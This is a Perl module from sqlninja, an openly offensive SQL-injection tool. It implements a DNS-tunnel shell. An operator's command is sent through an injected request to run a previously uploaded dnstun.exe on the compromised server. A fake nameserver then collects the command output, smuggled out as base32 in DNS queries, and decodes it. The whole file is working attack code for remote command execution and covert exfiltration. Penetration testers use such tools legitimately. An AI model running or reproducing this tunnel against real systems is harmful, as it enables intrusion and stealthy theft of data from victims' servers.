# This file is part of sqlninja
# Copyright (C) 2006-2013
# http://sqlninja.sourceforge.net
# icesurfer <r00t@northernfortress.net>
# nico <nico@leidecker.info>
# 
# Sqlninja is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Sqlninja is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with sqlninja. If not, see <http://www.gnu.org/licenses/>.

use strict;

our $conf;

# Attempt to tunnelize command output in DNS queries
# URL-encode the command, then call dnssend() 
# dnstunnel.exe must have been uploaded first
sub dnscmd
{
	print "[+] Starting dnstunnel mode...\n";
	if ($conf->{'verbose'} == 1) {
		print "  [v] Be sure you uploaded dnstunnel.exe already\n";
	}
	print "[+] Use \"exit\" to be dropped back to your shell.\n";
	my $cmd;
	while (1) {
		print "dnstunnel> ";
		$cmd = <STDIN>;
		chomp($cmd);
		if ($cmd eq "exit") {
			print "Thank you for using sqlninja... see ya\n";
			exit(0);
		}
		if ($cmd ne "") {
			dnsmaster($cmd);
		}
	}
}

# Handle the whole DNS tunneling process, spawning needed children and managing them
# $_[0] : command to execute
sub dnsmaster
{
	my $cmd = $_[0];
	my $requestpid; # pid of the web request
	my $decoderpid; # pid of the message decoder
	my $dnspid;     # pid of the fake DNS server
	my $timeoutpid; # pid of the timeout process
	$conf->{'dnssock'} = genfile("dns");
	unlink $conf->{'dnssock'}; # sock to communicate dns data
	
	# Create the server socket that will receive messages from children
	my $ninjasock;
	$ninjasock=genfile();
	unlink $ninjasock;
	if ($conf->{'verbose'} == 1) {
		print "  [v] Starting local UNIX socket\n";
	}
	# This socket is used to receive communications from the web request
	# child and the timeout child
	my $server = new IO::Socket::UNIX->new(Local => $ninjasock,
					       Type  => SOCK_DGRAM,
					       Listen=> 5)
				|| die "can't create UNIX socket: $!\n";
	my $msg; # message to the UNIX socket
				
	# spawn fake dns server
	if ($conf->{'verbose'} == 1) {
		print "  [v] Starting dns server process\n";
	}
	$dnspid = fork();
	if ($dnspid == -1) {
		print "can't fork dns server process\n";
		close $server;
		unlink $ninjasock;
		exit(1);
	}
	if ($dnspid == 0) {
		$server->close;
		dnsserver();
		exit(0);
	}
	# spawn decoder process
	if ($conf->{'verbose'} == 1) {
		print "  [v] Starting decoder process\n";
	}
	$decoderpid = fork();
	if ($decoderpid == -1) {
		print "can't fork decoder process\n";
		close $server;
		unlink $ninjasock;
		unlink $conf->{'dnssock'};
		exit(1);
	}
	if ($decoderpid == 0) {
		$server->close;
		decodedns($ninjasock);
		exit(0);
	}
	# spawn the process for the web request
	if ($conf->{'verbose'} == 1) {
		print "  [v] Starting web request process\n";
	}
	$requestpid = fork();
	if ($requestpid == -1) {
		print "can't fork web request process\n";
		close $server;
		unlink $ninjasock;
		unlink $conf->{'dnssock'};
		exit(1);
	}
	if ($requestpid == 0) {
		$server->close;
		dnscmdrequest($cmd);
		
		my $s = IO::Socket::UNIX->new(Peer => $ninjasock,
					      Type => SOCK_DGRAM,
					      Timeout => 10);
		$s->send("webdone");
		close $s;	    
		exit(0);
	}

	# Now wait for news....
	$server->recv($msg,16,0);


	# case 2: the web request returns but the decoder hasn't
	# finished receiving the messages yet
	# Since there is no other case, if we don't receive 
	# "webdone" something is wrong
	if ($msg ne "webdone") {
		kill TERM => $dnspid;
		kill TERM => $decoderpid;
		close $server;				
		unlink $ninjasock;
		unlink $conf->{'dnssock'};
		print "Unexpected message: ".$msg.".... must be a bug\n";
		exit(1);
	}
	
	# spawn the timeout child, to wait for some more packets 
	# to arrive
	if ($conf->{'verbose'} == 1) {
		print "  [v] Web request finished... waiting for last packets\n";
	}
	$timeoutpid = fork();
	if ($timeoutpid == -1) {
		 print "can't fork timeout child !\n";
		 kill TERM => $dnspid;
		 kill TERM => $decoderpid;
		 close $server;
		 unlink $ninjasock;
		 unlink $conf->{'dnssock'};
		 exit(1);
	}
	if ($timeoutpid == 0) {
		$server->close;
		sleep(6);
		my $s = IO::Socket::UNIX->new(Peer => $ninjasock,
					   Type => SOCK_DGRAM,
					   Timeout => 10);
		$s->send("timeout");
		close $s;
		exit(0);
	}
	
	# Wait for more news
	$server->recv($msg,16,0);

	# case 1 again...
	if ($msg eq "decoded") {
		kill TERM => $timeoutpid;
		kill TERM => $dnspid;
		kill TERM => $decoderpid;
		close $server;
		unlink $ninjasock;
		unlink $conf->{'dnssock'};
		return;
	}
	
	# case 2 again...
	if ($msg ne "timeout") {
		kill TERM => $dnspid;
		kill TERM => $decoderpid;
		close $server;
		unlink $ninjasock;
		unlink $conf->{'dnssock'};
		print "Unexpected message.... must be a bug\n";
		exit(1);
	}

	print "Some DNS packets seem to got lost.... try again\n";
	
	kill TERM => $dnspid;
	kill TERM => $decoderpid;
	close $server;
	unlink $ninjasock;
	unlink $conf->{'dnssock'};
	return;
}

sub dnscmdrequest
{
	my $cmd = "".$conf->{'uploaddir'}."\\dnstun.exe ".$conf->{'domain'}." ".$conf->{'hostnamelen'}." ".$_[0];
	if ($conf->{'churrasco'} == 1) {
		$cmd = usechurrasco($cmd);
	}
	my $command = createcommand($cmd);
	my $result = sendrequest($command);
}

# Sniff dns requests and processes them
sub dnsserver
{
	my $ns = Net::DNS::Nameserver->new(
			LocalAddr	=> "0.0.0.0",
			LocalPort    => 53,
			ReplyHandler => \&dns_cmd_reply_handler,
			Verbose      => 0
		) || die "could't create nameserver object\n";
	$ns->main_loop;	
}

sub dns_cmd_reply_handler
{ 
	my ($qname, $qclass, $qtype, $peerhost) = @_;
	my ($rcode, @ans, @auth, @add);
	if (($qtype ne "A") or ($qname !~ /$conf->{'domain'}/)) {
		return;
	}
	my ($ttl,$rdata) = (0,$conf->{'resolvedip'});
	push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
	$rcode = "NOERROR";
	my $s = IO::Socket::UNIX->new(Peer => $conf->{'dnssock'},
				      Type => SOCK_DGRAM,
				      Timeout => 20);
	$s->send($qname);
	close $s;
	return ($rcode, \@ans, \@auth, \@add, {aa => 1});
}

# Receives the dns messages from the sniffing child
# and processes them
sub decodedns
{
	my $ninjasock = $_[0];
	my $msg;  # message from the DNS daemon
	my @msgarray; # holds all received messages
	my $buffer = ""; # buffer to decode
	my $lastbuffered = -1; # last message appended to buffer
	my $number; # number of current message
	my $lastreceived = 0; # boolean: last packet received ?
	my $complete = 0;     # boolean: all packets received ?
	
	my $chunklen; # length of chunk to decode
	my $chunk; # chunk to decode
	my $decoded; # decoded chunk`
	my $n;
	my $m; 
	
	my $server = IO::Socket::UNIX->new(Local => $conf->{'dnssock'},
					   Type  => SOCK_DGRAM,
					   Listen=> 10)
			|| die "can't create UNIX socket: $!\n";
	# Let's start listening ! :)
	while ($complete == 0) {
		$server->recv($msg,255,0);
		# cut the domain and the dots....
		$msg =~ s/$conf->{'domain'}//;
		$msg =~ s/\.//g;

		# If there is a "9", it's the last message
		# Check dnstunnel.c for encoding details
		if ($msg =~ /9/) {
			($n,$m) = split(/9/,$msg);
			$lastreceived = 1;
		} else {
			($n,$m) = split(/8/,$msg);
		}

		# Insert the received message in the array
		$number=base32counterdecode($n);
		$msgarray[$number]=$m;
		# If the received message is exactly the same
		# that we were waiting for, append it to the buffer,
		# followed by other ones previously received in wrong 
		# order, if any
		my $arraylen = @msgarray;
		while (($msgarray[$number] ne "") and ($number<$arraylen)) {
			if ($number == ($lastbuffered+1)) {
				$buffer .= $msgarray[$number];
				$lastbuffered = $lastbuffered+1;
			}
				$number++;
		}
		
		# decode what can be decoded in the buffer and print
		$chunklen = (int(length($buffer)/8))*8;
		$chunk = substr($buffer,0,$chunklen);
		$buffer = substr($buffer,$chunklen);
		$decoded = base32decode($chunk);
		print $decoded;
		
		# Are we at the end ?
		$complete=checkdnscomplete(\@msgarray,$lastreceived);	
	}
	
	$decoded = base32decode($buffer);
	print $decoded;
	my $s = IO::Socket::UNIX->new(Peer => $ninjasock,
				      Type => SOCK_DGRAM,
				      Timeout => 10)
			||  die "can't create UNIX socket: $!\n";
	$s->send("decoded");
	close $s;
	exit(0);
}

# Check whether all messages have been received
sub checkdnscomplete
{
	my @msgarray=@{$_[0]};
	if ($_[1] == 0) {
		return 0;
	}
	my $number = @msgarray;
	my $i;
	my $complete = 1;
	if ($_[1] == 1) {
		for ($i=0;$i<$number;$i++) {
			if ($msgarray[$i] eq '') {
				$complete=0;
			}
		}
	}
	return $complete;
}

# decode a base32-encoded string
# Outrageously ripped from Convert-Base-32 by Tatsuhiko Miyagawa
sub base32decode
{
	my $encoded = $_[0];
	lc($encoded); # shouldn't be necessary... but just to be sure
	my %char2bits = qw@
		a 00000
		b 00001
		c 00010
		d 00011
		e 00100
		f 00101
		g 00110
		h 00111
		i 01000
		j 01001
		k 01010
		l 01011
		m 01100
		n 01101
		o 01110
		p 01111
		q 10000
		r 10001
		s 10010
		t 10011
		u 10100
		v 10101
		w 10110
		x 10111
		y 11000
		z 11001
		0 11010
		1 11011
		2 11100
		3 11101
		4 11110
		5 11111
	@;
	my $buffer = '';
	for my $pos (0..length($encoded)-1) {
		$buffer .= $char2bits{substr($encoded,$pos,1)};
	}
	return pack('B*',$buffer);
}

# decode a base32-encoded counter
sub base32counterdecode
{
	my $encoded = $_[0];
	my %char2number = qw@
		a 0
		b 1
		c 2
		d 3
		e 4
		f 5
		g 6
		h 7
		i 8
		j 9
		k 10
		l 11
		m 12
		n 13
		o 14
		p 15
		q 16
		r 17
		s 18
		t 19
		u 20
		v 21
		w 22
		x 23
		y 24
		z 25
		0 26
		1 27
		2 28
		3 29
		4 30
		5 31
	@;
	my $number;
	my $i;
	my $len = length($encoded);
	for my $pos (0..$len-1) {
		$i = $char2number{substr($encoded,$pos,1)};
		$number += $i*(32 ** ($len-1-$pos));
	}
	return $number;
}

1;